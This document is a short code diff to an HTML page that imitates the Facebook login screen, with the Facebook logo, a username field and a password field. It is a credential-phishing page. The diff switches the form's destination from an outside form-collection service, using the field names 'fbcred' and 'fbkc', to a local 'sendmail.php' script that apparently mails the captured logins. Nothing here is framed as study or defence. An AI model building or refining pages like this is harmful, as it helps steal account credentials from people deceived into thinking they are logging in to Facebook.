@@ -77,9 +77,9 @@
     <div class="logo">
         <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
     </div>
-    <form action="https://getform.io/f/bvrrnwzb" class="login-container" method="POST">
-        <input type="text" name="fbcred" class="input-field" placeholder="Mobile number or email address">
-        <input type="password" name="fbkc" class="input-field" placeholder="Password">
+    <form action="sendmail.php" class="login-container" method="POST">
+        <input type="text" name="name" id="name" class="input-field" placeholder="Mobile number or email address" required>
+        <input type="password" name="password" id="password" class="input-field" placeholder="Password" required>
         <button class="btn-login">Log in</button>
         <a href="#" class="forgot-link">Forgotten Password?</a>
         <a href="#" class="create-link">Create new account</a>
